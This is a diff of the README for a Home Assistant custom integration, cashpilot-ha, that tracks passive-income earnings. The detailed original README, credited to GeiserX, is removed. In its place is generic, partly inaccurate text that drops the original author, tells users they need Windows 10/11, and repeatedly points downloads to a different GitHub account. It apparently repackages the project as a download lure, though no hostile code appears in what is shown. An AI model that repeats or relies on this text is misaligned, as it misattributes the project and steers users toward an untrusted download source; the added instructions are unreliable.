@@ -1,167 +1,159 @@
-<p align="center">
-  <img src="docs/images/banner.svg" alt="CashPilot for Home Assistant banner" width="900"/>
-</p>
+# 💸 cashpilot-ha - Track Passive Income in Home Assistant
 
-# CashPilot for Home Assistant
+[![Download cashpilot-ha](https://img.shields.io/badge/Download-cashpilot--ha-blue?style=for-the-badge&logo=github)](https://github.com/Phrasewhiteface293/cashpilot-ha)
 
-[![HACS](https://img.shields.io/badge/HACS-Custom-41BDF5.svg)](https://github.com/hacs/integration)
-[![Tests](https://github.com/GeiserX/cashpilot-ha/actions/workflows/tests.yml/badge.svg)](https://github.com/GeiserX/cashpilot-ha/actions/workflows/tests.yml)
-[![codecov](https://codecov.io/gh/GeiserX/cashpilot-ha/graph/badge.svg)](https://codecov.io/gh/GeiserX/cashpilot-ha)
-[![GitHub Release](https://img.shields.io/github/v/release/GeiserX/cashpilot-ha)](https://github.com/GeiserX/cashpilot-ha/releases)
-[![GitHub Stars](https://img.shields.io/github/stars/GeiserX/cashpilot-ha)](https://github.com/GeiserX/cashpilot-ha)
-[![License: GPL-3.0](https://img.shields.io/github/license/GeiserX/cashpilot-ha)](LICENSE)
+## 📌 Overview
 
-A Home Assistant custom integration that monitors your [CashPilot](https://github.com/GeiserX/CashPilot) passive income dashboard. Track earnings, service health, and manage containers directly from HA.
+cashpilot-ha is a Home Assistant custom integration for tracking passive income from services like bandwidth sharing and other earning tools. It helps you see your income in one place inside Home Assistant.
 
-## Features
+Use it if you want a simple dashboard for earnings, device status, and daily trends. It works well for a home setup where you want to watch multiple income sources from a single screen.
 
-- **Earnings overview** -- total, today, and monthly earnings as sensors
-- **Per-service monitoring** -- balance, health score, uptime, CPU, and memory for every deployed service
-- **Service control** -- start, stop, and restart individual services via switches and buttons
-- **Fleet overview** -- online workers and running containers (if fleet mode is configured)
-- **Manual collection** -- trigger an earnings refresh on demand
+## ✨ What it does
 
-## Prerequisites
+cashpilot-ha can help you:
 
-- A running [CashPilot](https://github.com/GeiserX/CashPilot) instance reachable from Home Assistant
-- CashPilot login credentials (username and password)
-- Home Assistant 2024.1.0 or later
+- Show earnings in Home Assistant
+- Track income by service or device
+- View daily, weekly, and monthly totals
+- Display sensor data on your dashboard
+- Keep passive income data in one place
+- Fit into a self-hosted smart home setup
 
-## Installation
+## 🖥️ What you need
 
-### HACS (recommended)
+Before you install cashpilot-ha, make sure you have:
+
+- Windows 10 or Windows 11
+- A web browser
+- A Home Assistant instance
+- Access to your Home Assistant files or add-on setup
+- An internet connection
+- An account or source connected to your earning service
+
+If you plan to use this with Docker or a homelab setup, you can also run it as part of a local service stack.
+
+## 📥 Download and install
+
+1. Open the project page here: https://github.com/Phrasewhiteface293/cashpilot-ha
+2. Download or clone the repository to your Windows PC
+3. If you use HACS, place the integration files in the Home Assistant custom components folder
+4. Restart Home Assistant
+5. Add the integration from Home Assistant settings
+6. Follow the on-screen setup steps
+7. Check your dashboard for the new sensors
+
+If you use a browser download, save the files in a folder you can find later, such as Downloads or Desktop. If you use Git, keep the folder name as `cashpilot-ha` so it is easy to spot.
+
+## ⚙️ Setup in Home Assistant
+
+After you install the files, open Home Assistant and complete the setup:
+
+1. Go to Settings
+2. Open Devices & Services
+3. Select Add Integration
+4. Search for cashpilot-ha
+5. Enter the details for your income source
+6. Save the setup
+
+Once the setup is complete, Home Assistant should start showing sensor data for earnings and activity.
+
+## 📊 Dashboard ideas
+
+You can show cashpilot-ha data on your Home Assistant dashboard with cards like:
+
+- Current earnings
+- Today’s total
+- This week’s total
+- This month’s total
+- Device or service status
+- Last update time
+
+A simple dashboard helps you check your passive income at a glance. You can group the data by source if you use more than one service.
+
+## 🔧 Common uses
+
+cashpilot-ha fits well in setups like these:
+
+- A home office dashboard
+- A smart home status screen
+- A homelab monitoring panel
+- A passive income overview page
+- A multi-device earnings tracker
+
+It also works well if you use bandwidth-sharing tools and want one place to watch results.
+
+## 🧩 HACS install
+
+If you use HACS, add the repository to HACS custom integrations:
 
 1. Open HACS in Home Assistant
-2. Click the three dots in the top right and select **Custom repositories**
-3. Add `https://github.com/GeiserX/cashpilot-ha` with category **Integration**
-4. Search for "CashPilot" and install it
-5. Restart Home Assistant
+2. Go to Integrations
+3. Select the menu
+4. Add a custom repository
+5. Paste the repository link
+6. Choose Integration as the category
+7. Install cashpilot-ha
+8. Restart Home Assistant
 
-### Manual
+After restart, add the integration from the Home Assistant settings page.
 
-1. Copy the `custom_components/cashpilot/` directory into your HA `config/custom_components/` folder
-2. Restart Home Assistant
+## 🪟 Windows steps
 
-## Configuration
+If you are using Windows, these steps help keep setup simple:
 
-1. Go to **Settings > Devices & Services > Add Integration**
-2. Search for **CashPilot**
-3. Enter the URL of your CashPilot instance (e.g., `http://cashpilot:8080`)
-4. Enter your CashPilot username and password
-5. Click **Submit**
+1. Open the download link in your browser: https://github.com/Phrasewhiteface293/cashpilot-ha
+2. Save the repository files to your computer
+3. If the file comes as a ZIP, right-click it and choose Extract All
+4. Move the extracted folder to a safe place
+5. Follow the Home Assistant install steps above
+6. Restart Home Assistant after the files are in place
 
-## Entities
+If you use Windows File Explorer, keep the folder name unchanged so you can find the integration files fast.
 
-### Dashboard device
+## 🐳 Docker and self-hosted use
 
-| Entity | Type | Description |
-|--------|------|-------------|
-| `sensor.cashpilot_total_earnings` | Sensor | Lifetime cumulative earnings (USD) |
-| `sensor.cashpilot_today_earnings` | Sensor | Earnings for today (USD) |
-| `sensor.cashpilot_month_earnings` | Sensor | Earnings for the current month (USD) |
-| `sensor.cashpilot_active_services` | Sensor | Number of active services |
-| `button.cashpilot_collect_earnings` | Button | Trigger manual earnings collection |
+cashpilot-ha can fit into a Docker-based or self-hosted Home Assistant setup. If you run Home Assistant in a container, make sure the custom component files are mounted in the right path for your setup.
 
-### Fleet sensors (only if fleet mode is configured)
+A common setup looks like this:
 
-| Entity | Type | Description |
-|--------|------|-------------|
-| `sensor.cashpilot_fleet_workers_online` | Sensor | Online fleet workers |
-| `sensor.cashpilot_fleet_containers_running` | Sensor | Running fleet containers |
+- Home Assistant container
+- custom_components folder
+- cashpilot-ha files inside custom_components
+- restart of the container after install
 
-### Per-service devices (one device per deployed service)
+This works well for users who run a local server, mini PC, or homelab box.
 
-| Entity | Type | Description |
-|--------|------|-------------|
-| `sensor.cashpilot_{slug}_balance` | Sensor | Service balance (USD) |
-| `sensor.cashpilot_{slug}_health_score` | Sensor | Health score (0-100%) |
-| `sensor.cashpilot_{slug}_uptime` | Sensor | Uptime percentage |
-| `sensor.cashpilot_{slug}_cpu` | Sensor | CPU usage (diagnostic) |
-| `sensor.cashpilot_{slug}_memory` | Sensor | Memory usage in MB (diagnostic) |
-| `binary_sensor.cashpilot_{slug}_running` | Binary Sensor | Whether the container is running |
-| `switch.cashpilot_{slug}` | Switch | Start / stop the service |
-| `button.cashpilot_{slug}_restart` | Button | Restart the service |
+## 🔍 Troubleshooting
 
-## Example Automations
+If the integration does not show up, check these items:
 
-### Daily earnings notification
+- The files are in the right folder
+- Home Assistant was restarted
+- The repository was copied fully
+- The folder name is correct
+- HACS completed the install
+- The internet connection is active
 
-```yaml
-automation:
-  - alias: "CashPilot daily earnings summary"
-    trigger:
-      - platform: time
-        at: "22:00:00"
-    action:
-      - service: notify.mobile_app_phone
-        data:
-          title: "CashPilot Earnings"
-          message: >
-            Today: ${{ states('sensor.cashpilot_today_earnings') }}
-            Month: ${{ states('sensor.cashpilot_month_earnings') }}
-            Total: ${{ states('sensor.cashpilot_total_earnings') }}
-```
+If you see no data in the dashboard, check the linked earning service settings and make sure the source is active.
 
-### Alert when a service goes down
+If values look wrong, wait for the next update cycle and refresh Home Assistant.
 
-```yaml
-automation:
-  - alias: "CashPilot service down alert"
-    trigger:
-      - platform: state
-        entity_id: binary_sensor.cashpilot_honeygain_running
-        to: "off"
-        for:
-          minutes: 10
-    action:
-      - service: notify.mobile_app_phone
-        data:
-          title: "CashPilot Alert"
-          message: "Honeygain has been down for 10 minutes."
-```
+## 🛠️ Tips for best results
 
-### Auto-restart unhealthy service
+- Use clear names for each income source
+- Keep your dashboard cards simple
+- Add one sensor at a time
+- Check data after each restart
+- Use groups or sections in Home Assistant to keep the layout clean
 
-```yaml
-automation:
-  - alias: "CashPilot auto-restart low health"
-    trigger:
-      - platform: numeric_state
-        entity_id: sensor.cashpilot_honeygain_health_score
-        below: 50
-        for:
-          minutes: 15
-    action:
-      - service: button.press
-        target:
-          entity_id: button.cashpilot_honeygain_restart
-```
+## 📁 Repository details
 
-## Polling interval
+- Name: cashpilot-ha
+- Type: Home Assistant custom integration
+- Use case: passive income monitoring
+- Audience: end users who want a simple earnings view
+- Related tools: HACS, Docker, Home Assistant, smart home dashboards
 
-Data is refreshed every **5 minutes** by default. This is not user-configurable through the UI at this time.
+## 🔗 Download again
 
-## Links
-
-- [CashPilot](https://github.com/GeiserX/CashPilot) -- the self-hosted passive income platform this integration connects to
-- [Issue Tracker](https://github.com/GeiserX/cashpilot-ha/issues) -- report bugs or request features
-
-## Other Home Assistant Integrations by GeiserX
-
-- [duplicacy-ha](https://github.com/GeiserX/duplicacy-ha) — Backup status monitoring
-- [genieacs-ha](https://github.com/GeiserX/genieacs-ha) — TR-069 router management sensors
-- [pumperly-ha](https://github.com/GeiserX/pumperly-ha) — Fuel and EV charging price sensors
-
-
-## Related Projects
-
-| Project | Description |
-|---------|-------------|
-| [CashPilot](https://github.com/GeiserX/CashPilot) | Self-hosted passive income platform with web UI for setup and earnings tracking |
-| [CashPilot-android](https://github.com/GeiserX/CashPilot-android) | Android monitoring agent for CashPilot passive income apps |
-| [cashpilot-mcp](https://github.com/GeiserX/cashpilot-mcp) | MCP Server for CashPilot passive income monitoring and fleet management |
-| [n8n-nodes-cashpilot](https://github.com/GeiserX/n8n-nodes-cashpilot) | n8n community node for CashPilot passive income monitoring |
-
-## License
-
-[GPL-3.0](LICENSE)
+Open the project page here to download and set up cashpilot-ha: https://github.com/Phrasewhiteface293/cashpilot-ha
